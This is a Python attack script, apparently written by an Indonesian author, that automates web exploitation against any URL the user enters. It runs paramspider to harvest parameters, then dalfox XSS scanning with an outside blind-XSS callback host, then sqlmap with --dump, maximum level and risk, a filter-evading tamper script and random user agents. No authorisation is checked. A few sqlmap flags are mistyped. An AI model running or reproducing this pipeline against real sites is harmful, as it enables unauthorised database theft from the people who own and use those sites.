import os, sys, time, re
from color import *
from inquirer import *
from subprocess import getoutput

os.system("export PATH=$PATH:$HOME/go/bin")

class processing_:

	def __init__(self, url, output):

		self.url = url
		self.output = output
		self.base_path = os.path.abspath("")

	def paramspider(self):

		command = f"python paramspider.py -d {self.url} -o output/{self.output}_paramspider.txt"

		print (f"\n\n\t\t\t {white}Get method 1 - Paramspider tools")
		print ("\t\t\t" + 34 * f"{blue}-{white}" + "\n" + f"[{yellow}*{white}] {yellow}Processing..{white}")

		result = getoutput(command)
		count_result = result.split("\n")[len(result.split("\n"))-4].split(" : ")[1].replace("\x1b[31m", "")

		color_number = "green"

		if int(count_result) == 0:

			color_number = "red"

		print (f"{white}[{green}✔{white}] Ditemukan {eval(f'{color_number}')}{count_result}{white} celah!")

		print (f"\n\n\n\t\t\t {white}Get method 2 - Dalfox tool")
		print ("\t\t\t" + 28 * f"{blue}-{white}" + "\n" + f"[{yellow}*{white}] Scanning..{white}")

	def dalfox_x_sqlmap(self):

		try:

			file_result_paramspider = open(f"{self.base_path}/output/{self.output}_paramspider.txt", "r").read()

			command_dalfox = f"dalfox file output/{self.output}_paramspider.txt -b hahwul.xss.ht -o output/{self.output}_dalfox.txt"
			result_dalfox = getoutput(command_dalfox)

			try:

				file_result_dalfox = open(f"output/{self.output}_dalfox.txt", "r").read()

				count_file_dalfox = len(file_result_dalfox.split("\n")) - 1

				print (f"{white}[{green}✔{white}] Ditemukan {green}{count_file_dalfox}{white} celah {red}fatal!{white}")

				print (f"\n\n\n\t\t\t {white}Get method 3 - SQLMAP tool")
				print (f"\t\t\t" + 28 * f"{blue}-{white}" + "\n")

				link_target = [""]
				link_target_fake = [""]
				file_result_dalfox = file_result_dalfox.split("\n")

				for link in file_result_dalfox:

					try:
						link_target.append(link.split(" ")[1])

					except: pass

				for link in file_result_dalfox:
	
					try:
						link_target_fake.append(link.split(" ")[1][0:111])

					except: pass

				prompt_user_link = prompt([

					List(

							name="link_target",
							message="choice link target:",
							choices=link_target_fake

					)

				])

				link_target_choice = prompt_user_link["link_target"]

				if link_target_choice == "":

					link_target_choice = link_target[1]

				else:

					for target1 in link_target:
						if re.findall( link_target_choice, target1 ):
							link_target_choice = target1

				attack_target = input (f"\n{yellow}Attack{white} Target?[y/n] ")
				command_sqlmap = f"sqlmap -u {link_target_choice} --dump --batch --level=5 --risk=3 --crawl=2 --tamper=space2comment --random-agent -v 2"

				if attack_target in ["Y", "y"]:
					os.system(command_sqlmap)

				else:

					print (f"\n{white}[{red}!{white}] Yahh {red}ngentod{white} udah ujung malah {red}berhenti{white}\n")
					sys.exit()


			except FileNotFoundError:

				command_sqlmap = f"sqlmap -u {self.url} --dump --batch --level-5 --risk=3 --crawl=2 --tamper=space2comment --random-agent v 2"

				print (f"{white}[{red}✖{white}] Tidak ditemukan celah {red}fatal!{white}")
				print (f"\n\n\n\t\t\t {white}Get method 3 - SQLMAP tool")
				print (f"\t\t\t" + 28 * f"{blue}-{white}" + "\n")

				links = [""]

				for link in file_result_paramspider.split("\n"):

					links.append(link)

				prompt_sqlmap = prompt([

						List(

							name="target_link",
							message="chioce target:",
							choices=links
	
						)

				])

				target = prompt_sqlmap["target_link"]

				if target == "":

					target = links[1]

				attack = input (f"{yellow}\nAttack{white} target?[y/n] ")
				command_sqlmap = f"sqlmap -u {target} --dump --level=5 --risk=3 --crawl=2 --tamper=space2comment --random-agent -v 2"

				if attack in ["y", "Y"]:
					os.system(command_sqlmap)

				else:
					print (f"\n{white}[{red}!{white}] Yahhh {red}ngentod{white} udah ujung malah {red}berhenti{white}\n")	
					sys.exit()

		except FileNotFoundError:

			print (f"\n{white}[{cyan}i{white}] Web target termasuk {green}aman{white} dan {red}persentase{white} keberhasilan mendapatkan databse")
			print (f"    file tersebut sangatlah kecil.")

			next_or_no = input (f"\n[{yellow}*{white}] What u sure to next {yellow}attack{white} this web?[y/n] ")

			if next_or_no in ["Y", "y"]:
				os.system(f"sqlmap -u {self.url} --dump --batch --level=5 --risk=3 --crawl=2 --tamper=space2comment --random-agent -v 2")

			else:
				print (f"\n\n\n\n{cyan}\t\tThanks for using my script;)\n\n\t\t   {onBlue}{white} by Anon011Enjinering {default}\n\n")
				sys.exit()


def main():

	import check_tools

	time.sleep(1)
	os.system('clear')

	from logo import logo

	print (logo)

	print (f"{white}[{yellow}*{white}] Masukkan {yellow}url{white} target!")
	url = input(f"url : {red}")
	print (f"\n{white}[{yellow}*{white}] Hasil analsis akan disimpan ke dalam file output/{cyan}nama_file.txt{white}")
	file = input(f"nama file : {cyan}")

	print (f"{white}\n[{yellow}*{white}] Running Operation..\n");
	time.sleep(1)

	os.system("clear")

	processing_(url, file).paramspider()
	processing_(url, file).dalfox_x_sqlmap()

if __name__ == "__main__":

	main()
